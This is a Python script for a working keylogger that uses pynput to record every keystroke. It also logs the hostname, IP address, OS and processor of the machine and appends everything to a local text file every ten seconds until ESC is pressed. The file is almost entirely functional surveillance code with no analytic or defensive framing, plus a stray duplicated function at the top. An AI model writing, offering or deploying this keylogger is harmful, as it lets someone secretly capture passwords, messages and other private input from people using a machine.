import os
import platform
import socket
from pynput import keyboard
from threading import Timer

# --- Configuration ---
# The log file will be created in the directory where this script is executed.
LOG_FILENAME = "local_log.txt" 
REPORT_INTERVAL = 10 # seconds (how often to write the log to file)

def save_data(self, key):
        """Processes and saves captured keystrokes with CLEANER output."""
        
        # --- LOGIC TO STOP THE SCRIPT (OPTIONAL, BUT RECOMMENDED) ---
        if key == keyboard.Key.esc: # <-- 1. Checks if ESC is pressed
            self.append_log("\n[KEYLOGGER STOPPED BY ESC KEY]\n")
            self.write_report() # <-- 2. Writes the final log to the file
            return False #

class LocalLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = "Local KeyLogger Started...\n"
        self.append_system_info()
        self.write_report() # Initial system info report

    def append_log(self, string):
        """Appends new data to the internal log variable."""
        self.log += string

    def save_data(self, key):
        """Processes and saves captured keystrokes with CLEANER output."""
        
        # --- LOGIC TO STOP THE SCRIPT (OPTIONAL, BUT RECOMMENDED) ---
        if key == keyboard.Key.esc:
            self.append_log("\n[KEYLOGGER STOPPED BY ESC KEY]\n")
            self.write_report() # Write one last report before exit
            return False # Stops the pynput Listener
        # -----------------------------------------------------------

        try:
            # Capture regular character keys (e.g., a, b, 1, 2)
            current_key = str(key.char)
            
        except AttributeError:
            # Handle special keys for clean output
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n[ENTER]\n"
            elif key == keyboard.Key.backspace:
                current_key = " [BACKSPACE] "
            elif key == keyboard.Key.tab:
                current_key = " [TAB] "
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                current_key = " [SHIFT] "
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                current_key = " [CTRL] "
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                current_key = " [ALT] "
            # NOTE: Key.esc logic is handled at the start of the function
            
            # For all other special keys (e.g., F1, Home, Delete)
            else:
                key_name = str(key).split('.')[-1].upper()
                current_key = f" [{key_name}] "

        self.append_log(current_key)


    def append_system_info(self):
        """Collects and appends system details to the log."""
        self.append_log("-" * 30 + "\n")
        self.append_log(f"Hostname: {socket.gethostname()}\n")
        self.append_log(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
        self.append_log(f"System: {platform.system()} ({platform.machine()})\n")
        self.append_log(f"Processor: {platform.processor()}\n")
        self.append_log("-" * 30 + "\n")


    def write_report(self):
        """Writes the current log content to a local file."""
        # Only write if there is content to avoid empty entries after clearing
        if len(self.log) > 0:
            with open(LOG_FILENAME, "a") as f:
                f.write(self.log)
        
        # Clear the internal log after writing to file
        self.log = ""
        
        # Schedule the next report ONLY if the script hasn't been stopped
        # This check is necessary if the Timer is still running after ESC is pressed
        if not (hasattr(self, 'keyboard_listener') and not self.keyboard_listener.running):
            timer = Timer(self.interval, self.write_report)
            timer.start()


    def run(self):
        """Starts the keylogger listener and reporting timer."""
        # Setup the keyboard listener
        self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
        
        # Start listening for keystrokes
        with self.keyboard_listener:
            # The report timer is already started in __init__
            self.keyboard_listener.join()

            
if __name__ == "__main__":
    logger = LocalLogger(REPORT_INTERVAL)
    logger.run()